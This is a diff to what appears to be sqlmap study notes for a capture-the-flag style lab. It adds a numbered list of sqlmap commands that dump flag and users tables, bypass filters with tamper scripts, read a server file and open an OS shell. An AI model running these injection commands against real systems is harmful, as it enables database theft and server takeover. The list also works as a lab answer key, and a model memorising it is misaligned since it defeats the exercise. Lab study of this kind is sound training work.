@@ -111,4 +111,20 @@ In some cases, `UNION` SQLi payloads require extra user-provided information to 
 Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).  
 Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.
 
-
+Commands as per Risk and Levels : 
+1. `sqlmap -r Case2.txt --threads 10 --dump -T flag2 --batch`
+2. `sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch`
+3. `sqlmap -r Case4.txt --threads 10 --dump -T flag4 --batch`
+4. `sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries`
+5. `sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='`)'`
+6. `sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL`
+7. `sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb -dbms=MySQL --batch`
+8. `sqlmap -r Case1.txt --threads 10 --search -C style --batch`
+9. `sqlmap -r Case1.txt --threads 10 --dump -D testdb -T users --batch`
+10. `sqlmap -r Case8.txt --csrf-token=t0ken -T flag8 --dump --risk=3 --level=5 --batch`
+11. `sqlmap -r Case9.txt -T flag9 --dump --risk=3 --level=5 --batch --randomize=uid`
+12. `sqlmap -r Case10.txt -T flag10 --dump --risk=3 --level=5 --batch`
+13. `sqlmap -r Case11.txt -T flag11 --dump --risk=3 --level=5 --batch --tamper=greatest,least --threads=10`
+14. `sqlmap -r OsExploit.txt --file-read "/var/www/html/flag.txt" --batch --threads 10`
+15. `sqlmap -r OsExploit.txt --os-shell --threads 10 --batch`
+16. `sqlmap -r Add-To-Cart.txt --threads 10 --tamper=between -T final_flag --dump --batch`
